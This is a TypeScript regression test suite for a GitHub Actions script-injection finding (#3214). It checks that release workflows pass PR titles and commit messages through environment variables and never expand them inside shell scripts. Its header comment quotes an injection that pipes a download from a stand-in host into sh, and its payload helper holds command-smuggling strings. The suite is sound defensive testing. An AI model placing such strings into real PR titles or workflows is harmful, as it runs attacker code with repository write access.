/**
 * Finding #3214: the release workflows pasted attacker-controlled text into
 * shell source.
 *
 * auto-release.yml (contents: write) expanded `${{ github.event.pull_request.title }}`
 * and the PR labels and author inside `run:` scripts, and version-bump-on-main.yml
 * (contents: write) expanded `${{ github.event.head_commit.message }}`. The
 * runner substitutes `${{ }}` into the script TEXT before bash parses it, so a
 * PR title like `x"; curl evil | sh; echo "` ran with a write token.
 *
 * The fix passes every such value through `env:` and reads it as a quoted
 * shell variable. This suite checks both halves:
 *   1. statically, no `run:` script in the two workflows contains `${{ }}`;
 *   2. dynamically, the real step scripts are executed the way the runner
 *      executes them (expressions substituted as text, env set, bash -eo
 *      pipefail) with crafted titles and commit messages, and nothing runs.
 *
 * No network, no GitHub: bash in a temp dir.
 */
import { afterAll, describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { parse } from "yaml";

const WORKFLOWS = join(import.meta.dir, "..", "..", ".github", "workflows");
const FILES = ["auto-release.yml", "version-bump-on-main.yml"];

interface Step {
	name?: string;
	id?: string;
	run?: string;
	env?: Record<string, string>;
}

function steps(file: string): Step[] {
	const wf = parse(readFileSync(join(WORKFLOWS, file), "utf-8"));
	return Object.values(wf.jobs as Record<string, { steps: Step[] }>).flatMap((j) => j.steps);
}

function step(file: string, idOrName: string): Step {
	const s = steps(file).find((x) => x.id === idOrName || x.name === idOrName);
	if (!s?.run) throw new Error(`no run step ${idOrName} in ${file}`);
	return s;
}

/** Substitute `${{ expr }}` as the runner does: plain text, before bash parses. */
function render(text: string, ctx: Record<string, string>): string {
	return text.replace(/\$\{\{\s*(.+?)\s*\}\}/g, (_m, expr: string) => ctx[expr] ?? "");
}

const dir = mkdtempSync(join(tmpdir(), "wf-injection-"));
afterAll(() => rmSync(dir, { recursive: true, force: true }));

/** Run one step's script like the runner (bash --noprofile --norc -eo pipefail). */
function runStep(s: Step, ctx: Record<string, string>): { outputs: string; cwd: string } {
	const cwd = mkdtempSync(join(dir, "step-"));
	const outFile = join(cwd, "GITHUB_OUTPUT");
	writeFileSync(outFile, "");
	const script = join(cwd, "step.sh");
	writeFileSync(script, render(s.run as string, ctx));
	const env: Record<string, string> = {
		PATH: process.env.PATH ?? "/usr/bin:/bin",
		HOME: cwd,
		GITHUB_OUTPUT: outFile,
		GITHUB_STEP_SUMMARY: join(cwd, "SUMMARY"),
	};
	for (const [k, v] of Object.entries(s.env ?? {})) env[k] = render(String(v), ctx);
	spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", script], {
		cwd,
		env,
		encoding: "utf-8",
	});
	return { outputs: readFileSync(outFile, "utf-8"), cwd };
}

/** Payloads that each try to create `marker` if pasted into shell source. */
function payloads(marker: string): string[] {
	return [
		`feat: x"; touch ${marker}; echo "`,
		`feat: $(touch ${marker})`,
		`feat: \`touch ${marker}\``,
	];
}

describe("#3214: no expression is expanded inside a run: script", () => {
	for (const file of FILES) {
		test(`${file} has no \${{ }} in any run: block`, () => {
			const offenders = steps(file)
				.filter((s) => s.run?.includes("${{"))
				.map((s) => s.name ?? s.id);
			expect(offenders).toEqual([]);
		});

		test(`${file} pins every action to a commit SHA`, () => {
			const unpinned = readFileSync(join(WORKFLOWS, file), "utf-8")
				.split("\n")
				.filter((l) => /^\s*-?\s*uses:/.test(l))
				.filter((l) => !/@[0-9a-f]{40}\b/.test(l));
			expect(unpinned).toEqual([]);
		});
	}
});

describe("#3214: crafted PR titles and commit messages run nothing", () => {
	test("auto-release: Determine version bump", () => {
		const marker = join(dir, "m-bump");
		for (const title of payloads(marker)) {
			const { outputs } = runStep(step("auto-release.yml", "bump_type"), {
				"github.event.pull_request.title": title,
				"join(github.event.pull_request.labels.*.name, ',')": `x"; touch ${marker}; echo "`,
			});
			expect(existsSync(marker)).toBe(false);
			// The title is still read as data: "feat: ..." is a minor bump.
			expect(outputs).toContain("bump=minor");
		}
	});

	test("auto-release: Generate release notes keeps the title as text", () => {
		const marker = join(dir, "m-notes");
		for (const title of payloads(marker)) {
			const { cwd } = runStep(step("auto-release.yml", "release_notes"), {
				"steps.new_version.outputs.version": "1.2.3",
				"steps.latest_tag.outputs.tag": "v0.0.0",
				"github.event.pull_request.number": "42",
				"github.event.pull_request.user.login": `a$(touch ${marker})`,
				"github.event.pull_request.title": title,
				"github.repository": "8gi-foundation/8gent-code",
			});
			expect(existsSync(marker)).toBe(false);
			expect(readFileSync(join(cwd, "release_notes.md"), "utf-8")).toContain(title);
		}
	});

	test("version-bump-on-main: Decide bump level", () => {
		const marker = join(dir, "m-level");
		for (const p of payloads(marker)) {
			const { outputs } = runStep(step("version-bump-on-main.yml", "level"), {
				"github.event.head_commit.message": `${p} [bump:minor]`,
			});
			expect(existsSync(marker)).toBe(false);
			expect(outputs).toContain("level=minor");
		}
	});
});
